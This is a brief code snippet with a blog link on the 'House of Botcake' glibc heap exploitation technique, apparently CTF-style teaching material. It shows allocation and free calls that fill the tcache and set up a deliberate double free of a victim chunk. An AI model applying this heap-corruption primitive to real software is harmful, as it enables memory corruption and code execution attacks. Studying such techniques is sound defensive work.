**Blog: https://4xura.com/pwn/house-of-botcake/**

```py
for i in range(9):
	add(0x100)	# 0 1 2 3 4 5 6 7 8
for i in range(7):
    free(i)		# 0 1 2 3 4 5 6
free(8)	# victim
free(7)
add(0x100)
free(8)	# double free
```

